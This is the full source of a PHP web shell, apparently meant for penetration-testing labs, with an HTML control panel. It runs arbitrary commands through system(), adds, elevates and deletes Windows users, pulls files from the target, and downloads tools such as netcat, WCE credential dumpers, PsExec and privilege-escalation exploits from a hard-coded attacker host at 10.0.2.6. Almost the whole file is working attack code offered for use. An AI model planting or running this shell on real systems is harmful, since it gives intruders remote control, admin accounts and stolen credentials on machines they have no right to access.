<!doctype html>
<html lang="en">
	<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
	<title>The Not-So Simple Command Shell by KaotickJ</title>
	</head>
	<body>
		<?php
		$attackip = "10.0.2.6";
		$attackport = "8000";
		echo '
		<div style="border:1px solid #333;width:50%;padding:0px 30px;border-radius:10px;margin:10px 40px;">
		<h4 style="">The Not So Simple Command Shell</h4>
		<form action="" method="get">Command? <input type="text" name="cmd" autofocus/>
		<button type="submit">Execute</button></form>
		<p>File Options</p>
		<form action="" method="get">
		<select name="upload">
		<option>Choose</option>
		<option value="Invoke-WScriptBypassUAC.ps1">WScriptBypassUAC (Win7)</option>
		<option value="jaws-enum.ps1">JAWs Enum</option>
		<option value="ms15-05164.exe">MS15-051 Priv Esc</option>
		<option value="nc.exe">Netcat 32</option>
		<option value="nc64.exe">Netcat 64</option>
		<option value="PsExec.exe">PsExec</option>
		<option value="PsInfo.exe">PsInfo</option>
		<option value="pspasswd.exe">PsPasswd</option>
		<option value="PowerUp.ps1">PowerUp.ps1</option>
		<option value="Taihou64.exe">Taihou 15-1701 PrivEsc</option>
		<option value="venom.exe">VENOM.EXE</option>
		<option value="wce32.exe">WCE 32</option>
		<option value="wce64.exe">WCE 64</option>
		<option value="wce-universal.exe">WCE Universal</option>
		</select><button type="submit">Upload</button>
		</form>
		<p><or enter filename></p>
		<form action="" method="get" enctype="multipart/form-data"><input name="upload" type="file" placeholder="File to Upload"/><button type="submit">Upload</button></form><br>
		<form action="" method="get"><input type="text" name="download" placeholder="File to Download"/><button type="submit" title="downloads file to attack machine">Download</button></form>
		<form action="" method="get">
		<p>Quick Enum Options</p>
		<button type="submit" name="cmd" value="systeminfo" title="runs systeminfo command">System Info</button>&nbsp;<button type="submit" name="cmd" value="whoami" title="shows current user">Whoami</button>&nbsp<button type="submit" name="cmd" value="echo %username%" title="another option to display current user">Username</button>&nbsp;<button type="submit" name="cmd" value="whoami /all" title="gives current user information">User Info</button>&nbsp;<button type="submit" name="cmd" value="net user" title="lists all users">All Users</button>&nbsp;<button type="submit" name="cmd" value="netsh wlan show profiles" title="">WLAN Profiles</button><br><br><button type="submit" name="cmd" value="tasklist" title="show running processes">Processes</button>&nbsp<button type="submit" name="cmd" value="driverquery" title="list drivers">Drivers</button>&nbsp<button type="submit" name="cmd" value="driverquery | findstr Kernel" title="look for potential kernel exploits">Kernel Exploits</button>&nbsp<button type="submit" name="cmd" value="fsutil fsinfo drives" title="list all drives">List Drives</button>&nbsp<button type="submit" name="cmd" value="set" title="environment variable settings">EnVars</button>&nbsp;<button type="submit" name="cmd" value="qwinsta" title="information about sessions">Query Session</button>		
		</form>
		<p>User Management Options</p>
		<form action="" method="get">
		<input type="text" name="user" placeholder="user to alter" />&nbsp;&nbsp;<input type="text" name="pass" placeholder="password if adding user" />
		<br><br>
		<button type="submit" name="addUser" title="adds the secified user to the system with the password provided.">Add User</button>&nbsp;<button type="submit" name="userAdmin" title="sets the specified user as adminstrator. only works with sufficient permissions on the current user.">Set Admin</button>&nbsp;<button type="submit" name="delUser" title="deletes the specified user from the system. only works with sufficient permissions on the current user.">DelUser</button>&nbsp;&nbsp;&nbsp;<button onClick="window.location.reload();">Clear Console</button> 
		</form>
		<p style=""><small>The Not-So Simple Command Shell - Courtesy of KaotickJ</small></p>
		</div>';

		if (isset($_GET['addUser'])){
			if(empty($_GET['user'])) die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>you need to enter a username for the new user</p></div>');
			if(empty($_GET['pass'])) die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>you need to enter a password for the new user</p></div>');
			echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
			echo (system("net user ".$_GET['user']." ".$_GET['pass']." /add"));
			echo '</pre>';
		}
			
		if (isset($_GET['userAdmin'])){
			if(empty($_GET['user'])) die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>you need to enter a user to escelate to admin</p></div>');
			echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
			echo (system("net localgroup administrators ".$_GET['user']." /add"));
			echo '</pre>';
		}
			
		if (isset($_GET['delUser'])){
			if(empty($_GET['user'])) die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>you need to enter a user to delete</p></div>');
			echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';    
			echo (system("net user ".$_GET['user']." /del"));
			echo '</pre>';
		}    

		if(isset($_GET['download'])) {
			$filename = $_GET['download'];
			if(file_exists($filename)) {
				header('Content-Description: File Transfer');
				header('Content-Type: application/octet-stream');
				header("Cache-Control: no-cache, must-revalidate");
				header("Expires: 0");
				header('Content-Disposition: attachment; filename="'.basename($filename).'"');
				header('Content-Length: ' . filesize($filename));
				header('Pragma: public');
				flush();
				readfile($filename);
				die();
			} else{
				die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>resource not found. make sure specified file exists on the target box</p></div>');
			}
		}

		if (isset($_GET['upload'])) {
			if($_GET['upload'] == "") die('<div style="background:red;color:#fff;margin:10px 40px;padding:30px;width:50%;"><h4>Error!</h4><p>you must choose a file to upload first.</p></div>');
			if($_GET['upload'] == "Choose") die('<div style="background:red;color:#fff;margin:10px 40px;padding:30px;width:50%;"><h4>Error!</h4><p>you must choose a file to upload first.</p></div>');
			file_put_contents($_GET['upload'], file_get_contents("http://".$attackip.":".$attackport."/" .$_GET['upload']));
		}

		if (isset($_GET['cmd'])) {
			if($_GET['cmd'] == "") die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>no command specified. you must enter a command to be executed</p></div>'); 
			echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
			echo (system($_GET['cmd']));
			echo '</pre>';
		}
		?>
	</body>
</html>